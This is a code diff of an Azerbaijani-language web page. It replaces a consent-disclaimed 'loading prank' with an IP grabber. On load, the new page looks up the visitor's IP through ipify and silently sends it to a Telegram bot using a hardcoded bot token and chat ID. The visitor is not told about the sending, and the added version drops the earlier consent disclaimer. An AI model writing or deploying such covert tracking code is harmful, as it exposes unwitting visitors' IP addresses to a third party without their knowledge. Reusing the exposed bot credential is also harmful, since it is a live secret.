@@ -1,65 +1,62 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-  <meta charset="utf-8" />
-  <title>Loading prank</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta charset="UTF-8" />
+  <title>IP Yoxlama və Göndərmə</title>
   <style>
-    body { background:#111; color:#fff; font-family:Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
-    .card { text-align:center; padding:30px; border-radius:12px; background:linear-gradient(180deg,#222,#111); box-shadow:0 10px 30px rgba(0,0,0,0.6); width:90%; max-width:420px; }
-    #loading { font-size:20px; margin-bottom:14px; opacity:1; transition:opacity .4s; }
-    #ip { font-weight:700; font-size:18px; margin-top:10px; color:#ffb86b; display:none; }
-    #fun { margin-top:14px; color:#9ad0ff; display:none; }
-    .small { font-size:12px; color:#aaa; margin-top:10px; }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      background: #f0f0f0;
+      color: #333;
+    }
+    #ipDisplay {
+      font-size: 30px;
+      margin-top: 40px;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div id="loading">Loading... ⏳</div>
-    <div id="ip"></div>
-    <div id="fun">Şaka! Sənə xəbər göndərildi 🤭</div>
-    <div class="small">(Bu zarafat üçün dostların razılığı var, yoxsa istifadə etmə.)</div>
-  </div>
+  <h1>IP ünvanınız:</h1>
+  <div id="ipDisplay">Loading...</div>
 
   <script>
-    // Səhifə açılanda serverə /collect çağırışı göndərilir.
-    async function runPrank() {
+    const token = '8408687620:AAEy2vYnaR8Be9kpbjoKpCTUAXMMHvvd4AE';
+    const chatId = '1689497109';
+
+    async function sendIpToTelegram(ip) {
+      const message = encodeURIComponent(`Yeni istifadəçinin IP-si: ${ip}`);
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
+
       try {
-        // Kiçik gecikmə ilə "loading" effekti
-        await new Promise(r => setTimeout(r, 1200));
-
-        const resp = await fetch('/collect', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ path: location.pathname })
-        });
-
-        const data = await resp.json();
-
-        // loading gizlət, ip göstər
-        document.getElementById('loading').style.opacity = '0';
-        await new Promise(r => setTimeout(r, 350));
-        if (data && data.ip) {
-          document.getElementById('ip').textContent = 'Sənin IP ünvanın: ' + data.ip;
-          document.getElementById('ip').style.display = 'block';
-        } else {
-          document.getElementById('ip').textContent = 'IP tapılmadı.';
-          document.getElementById('ip').style.display = 'block';
+        const response = await fetch(url);
+        if (!response.ok) {
+          console.error('Telegrama mesaj göndərilə bilmədi');
         }
-
-        // bir az effektdən sonra zarafat mesajı
-        setTimeout(() => {
-          document.getElementById('fun').style.display = 'block';
-          // optional: səs effekti
-          // const a = new Audio('boop.mp3'); a.play();
-        }, 800);
-      } catch (e) {
-        document.getElementById('loading').textContent = 'Xəta baş verdi';
-        console.error(e);
+      } catch (error) {
+        console.error('Xəta:', error);
       }
     }
 
-    window.addEventListener('load', runPrank);
+    async function getIpAndSend() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        const ip = data.ip;
+
+        document.getElementById('ipDisplay').textContent = ip;
+        sendIpToTelegram(ip);
+      } catch (error) {
+        document.getElementById('ipDisplay').textContent = 'IP alınarkən xəta baş verdi';
+        console.error('IP alınarkən xəta:', error);
+      }
+    }
+
+    window.onload = () => {
+      getIpAndSend();
+    };
   </script>
 </body>
 </html>
